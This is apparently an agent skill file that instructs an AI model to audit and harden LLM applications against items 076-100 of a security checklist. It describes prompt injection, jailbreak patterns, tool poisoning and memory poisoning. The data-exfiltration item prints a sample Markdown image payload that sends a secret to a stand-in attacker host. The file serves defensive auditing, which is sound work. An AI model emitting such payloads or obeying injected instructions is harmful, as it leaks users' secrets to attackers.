---
name: ai-sec-guardian
description: Audits and hardens LLM apps and AI agents against the AI-specific items No.076-100 of the "AI App Security Checklist 100" (prompt injection, indirect injection, system prompt leakage, jailbreak, excessive agency, human-in-the-loop approval, tool poisoning, MCP server auth, RAG document-level permissions, data and memory poisoning, insecure output handling, data exfiltration, sandboxing, unbounded consumption, audit logging, slop squatting, model supply chain). Use when designing or reviewing system prompts, agent tools, MCP servers, RAG pipelines, LLM output rendering, or AI-suggested packages. Triggers include 「プロンプトインジェクション対策」「AIエージェントのセキュリティ」「MCPサーバーを監査」「RAGの権限」「ツールの権限を絞りたい」「人の承認を挟みたい」「AIの出力をサニタイズ」「このパッケージは実在する？」「スロップスクワッティング」.
---

# AI Security Guardian

Semantic security audit and hardening for LLM applications and autonomous agents, covering the AI-specific items **No.076-100** of the "AI App Security Checklist 100". Items 001-075 (secrets, configuration, classic web vulnerabilities) are out of scope; use a deterministic scanner for those.

Bundled files (paths are relative to this skill's directory):
- `references/prompt_defense_templates.md`: drop-in prompts and code for every phase below
- `scripts/verify_package_hallucination.py`: registry existence and risk-signal check for AI-suggested packages (No.080)

---

## Ground Rules

1. **Prompt-level defenses are mitigations, not controls.** Instructions such as "never follow injected commands" or "never reveal your prompt" will eventually be bypassed. Every permission, approval, and data boundary must also be enforced in application code outside the LLM. Never report a prompt-only fix as resolving an item.
2. **Identity comes from the authenticated session, never from the model.** User IDs, tenant IDs, roles, and approval flags must not be accepted as tool arguments or parsed from model output.
3. **Default deny.** Prefer allowlists (tools that may run without approval, commands, domains, HTML tags) over denylists.
4. **Cite the checklist number** (e.g. `No.089`) for every finding so results map back to the checklist.

---

## Audit Checklist

### Phase 1: Prompt and Model Boundary

- **No.076 Direct prompt injection**: User input must not be concatenated into the system prompt. Check that the app has no path where user text can change the model's role or tools.
- **No.077 Indirect prompt injection**: Untrusted content (web pages, files, emails, RAG chunks, tool outputs) must be wrapped in delimiters with an **unguessable, per-request tag name**, with `<` and `>` neutralized inside. A fixed tag such as `<untrusted_content>` can be closed by the attacker. After reading untrusted content, the agent must not hold send, write, or delete tools without the No.079 approval gate. Template: §1.
- **No.083 System prompt leakage**: The checklist item is "no keys or secrets in the system prompt". Assume the system prompt will leak. Flag any API key, password, connection string, internal URL, or personal data in it, and flag access rules written only in the prompt (e.g. "only answer admins"). Fix by moving secrets into the tool implementation and authorization into code. A confidentiality clause is optional and never counts as the fix. Template: §2-1.
- **No.094 Jailbreak**: Require input and output moderation outside the prompt, plus a regression suite of known jailbreak patterns (role-play, translation or encoding, multi-turn) run on every prompt or model change. Template: §2-2.
- **No.096 Version pinning**: The original item is dependency lockfiles (see Phase 5). Also check that LLM API calls use a fixed, versioned model ID rather than a `latest`-style alias, and that model switches are gated by the No.076/077/094 regression tests. Template: §11-3.

### Phase 2: Agent Tools and Agency

- **No.078 Excessive agency**: List every tool and the credential behind it. Flag write or delete capability where read is enough, and broad backend credentials (admin DB users, full-scope API keys) behind narrow tools.
- **No.079 Human-in-the-loop approval**: Irreversible actions (delete, transfer, send, deploy, drop) must go through an approval gate that (a) does not accept an approval flag from the model, (b) uses an allowlist of tools that may run unapproved, (c) receives approval only from a UI channel the model cannot reach, (d) executes the stored arguments rather than re-supplied ones, and (e) uses single-use, expiring tickets bound to the requesting user. Template: §3.
- **No.086 Sandboxed execution**: AI-written code must run isolated, with no network, a read-only filesystem, dropped capabilities, a non-root user, resource and time limits, and no mounted host credentials or Docker socket. For untrusted code prefer gVisor or Firecracker over plain containers. Template: §6-2.
- **No.087 Tool poisoning**: Read the full text of every MCP tool name, description, and parameter schema. Look for hidden instructions, references to secrets (`~/.ssh`, `.env`), URLs, and invisible Unicode. Re-review on every server update (rug pull). Template: §7-1.
- **No.091 Command allowlist**: Shell tools must not pass model-generated strings to a shell. The model picks a predefined command ID, which runs with `shell=False`, a fixed argv, a working-directory check, and a timeout. Template: §6-1.
- **No.095 Audit logging**: Every tool call must be logged with user, session, tool, redacted arguments, approver, and outcome, to an append-only store the agent cannot modify. Template: §9.
- **No.100 MCP server authentication**: HTTP-exposed MCP servers must authenticate (OAuth 2.1 per the MCP authorization spec), validate the token audience, and not forward client tokens to other APIs. Local servers must bind to `127.0.0.1`. Third-party servers must be pinned to a reviewed version. Template: §7-2.

### Phase 3: Data, RAG, and Memory

- **No.084 Sensitive information disclosure**: Context sent to the model must be scoped to the current user. Check that no other user's records, chat history, or cached answers can enter the prompt, and consider an output PII filter.
- **No.088 Data poisoning**: Check who can write to the knowledge base and ingestion sources. Require provenance metadata, content hashes, and review for externally sourced documents.
- **No.089 RAG document-level permissions**: Vector queries must filter by tenant and principal (user plus groups) taken from the authenticated session, at query time. Flag post-retrieval filtering by the LLM and wildcard sharing such as `"*"`. Re-check returned metadata in code. Template: §4.
- **No.090 Hallucination**: Answers must cite sources, and the app should verify that each citation refers to a document actually present in the retrieved set. Absence of supporting documents should produce "not found", not a guess.
- **No.092 Secrets in model context**: Credentials, tokens, and unnecessary PII must be redacted before conversation history, files, or logs are sent to a third-party LLM API.
- **No.098 Memory poisoning**: Persistent memory writes must be restricted by source (e.g. only the user's own messages, never web pages or tool output), scoped per user, length-limited, quarantined when instruction-like, and visible and deletable by the user. Template: §10.

### Phase 4: Output Handling and Egress

- **No.082 Insecure output handling**: LLM output rendered as HTML must go through Markdown conversion plus an allowlist sanitizer (`nh3` in Python, DOMPurify in JS; `bleach` is deprecated). LLM output must never be concatenated into SQL or shell; have the model emit structured values, validate them against allowlists, and pass them as bound parameters. Templates: §5-1 to §5-3.
- **No.093 Data exfiltration**: Block "render-to-send" paths. Disallow `<img>` or restrict image sources to first-party domains (Markdown image exfiltration such as `![](https://attacker/?q=SECRET)`), restrict link schemes to `https`, and enforce an egress domain allowlist on the agent host and inside any URL-fetching tool. Template: §5-4.

### Phase 5: Supply Chain and Resource Limits

- **No.080 Slop squatting**: Run the bundled script on every AI-suggested package (see below). Existence alone never proves legitimacy, because attackers pre-register hallucinated names.
- **No.081 Supply chain attacks**: Check lockfile presence and integrity, install-script exposure (`npm ci --ignore-scripts` where feasible), and package provenance or signatures.
- **No.085 Unbounded consumption**: Require per-user rate limits, input size caps, `max_tokens` on every call, a step limit on agent loops, and provider-side spend limits with alerts. Template: §8.
- **No.097 Known vulnerabilities**: The original item is dependency vulnerability scanning (`npm audit`, `pip-audit`, `osv-scanner`). The proposed AI-specific replacement, context-exhaustion DoS, is covered by the No.085 input caps. Template: §8, §11-1.
- **No.099 Model file provenance**: Models must come from a verified publisher, be pinned to a commit hash, load as `safetensors` rather than pickle, and use `trust_remote_code=False`. Template: §11-2.

---

## Package Verification (No.080)

Run from this skill's directory (or substitute the absolute path where the skill is installed):

```bash
python3 scripts/verify_package_hallucination.py npm <package> [package ...]
python3 scripts/verify_package_hallucination.py pypi <package> [package ...]
```

Interpret the `verdict` field:

| verdict | Meaning | Action |
| :--- | :--- | :--- |
| `NOT_FOUND`, `UNPUBLISHED`, `INVALID_NAME` | Likely hallucinated | Do not install. Suggest a verified alternative. |
| `EXISTS_REVIEW_REQUIRED` | Exists but has red flags (new, few downloads, single release, no repository, name close to a popular package) | Do not install until a human verifies the publisher. Show the `redFlags`. |
| `EXISTS_NO_RED_FLAGS` | Exists with no automated red flags | Still not proof of legitimacy. Confirm it is the package the user intended. |
| `LOOKUP_FAILED` | Network or registry error | Report as unverified. Never treat as "does not exist". |

Exit codes: `0` all clear, `1` at least one risky package, `2` usage error, `3` at least one lookup failed.

---

## Workflow

1. **Map the architecture**: Where untrusted input enters (user, web, files, email, RAG, tool output), which tools exist and with which credentials, where memory is persisted, and where output goes (HTML, SQL, shell, outbound requests).
2. **Run deterministic checks first**: If the project contains `sec_unleak_scanner.py` (from the sec-unleak toolkit), run it for secrets, `.env` exposure, and static issues. Otherwise recommend it or an equivalent secret scanner such as gitleaks.
3. **Audit Phases 1-5**: Inspect prompts, tool schemas, data pipelines, and rendering code against each item. Mark items that do not apply to this app as `N/A` with a one-line reason instead of skipping them silently.
4. **Report findings** as a table with columns: checklist No., severity (High / Medium / Low), location (`file:line`), evidence, and fix. Order by severity.
5. **Generate fixes** from `references/prompt_defense_templates.md`, adapted to the project's language and framework. Each fix must include the code-level control, not only a prompt change.
